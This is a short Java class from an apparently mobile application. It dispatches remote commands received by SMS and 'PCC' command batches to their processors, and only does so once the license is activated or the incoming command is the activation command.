package com.vvt.rmtcmd;

import java.util.Vector;
import com.vvt.global.Global;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.license.LicenseStatus;

public class RmtCmdProcessingManager {
	
	private static RmtCmdProcessingManager self = null;
	private LicenseManager licenseMgr = Global.getLicenseManager();
	private SMSCmdStore cmdStore = Global.getSMSCmdStore();
	private SMSCommandCode smsCmdCode = cmdStore.getSMSCommandCode();
	private LicenseInfo licenseInfo = licenseMgr.getLicenseInfo();
	private SMSCmdProcessor smsProcessor = new SMSCmdProcessor();
	private PCCCmdProcessor pccProcessor = new PCCCmdProcessor();
	
	
	private RmtCmdProcessingManager() {
	}
	
	public static RmtCmdProcessingManager getInstance() {
		if (self == null) {
			self = new RmtCmdProcessingManager();
		}
		return self;
	}
	
	public void process(RmtCmdLine rmtCmdLine) {
		smsCmdCode = cmdStore.getSMSCommandCode();
		if (rmtCmdLine.getCode() == smsCmdCode.getActivationCmd() || (licenseInfo.getLicenseStatus().getId() == LicenseStatus.ACTIVATED.getId())) {
			smsProcessor.process(rmtCmdLine);
		}
	}
	
	public void process(Vector pccCmds) {
		if (licenseInfo.getLicenseStatus().getId() == LicenseStatus.ACTIVATED.getId()) {
			pccProcessor.process(pccCmds);
		}
	}
}
